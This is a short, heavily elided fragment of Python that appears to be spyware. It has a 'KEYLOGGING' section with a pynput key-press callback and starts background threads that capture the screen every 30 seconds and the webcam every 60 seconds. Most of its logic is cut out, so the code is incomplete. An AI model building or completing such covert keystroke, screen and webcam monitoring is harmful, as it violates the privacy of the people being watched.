...
# --- KEYLOGGING ---
def keyPressed(key):
    """Callback function for pynput to log key presses."""
    try:
...
if __name__ == "__main__":
    ...
    try:
        ...
        screen_thread = threading.Thread(target=screen_capture_loop, args=(30,), daemon=True)
        screen_thread.start()

        # Start webcam capture thread
        webcam_thread = threading.Thread(target=webcam_capture_loop, args=(60,), daemon=True)
        webcam_thread.start()
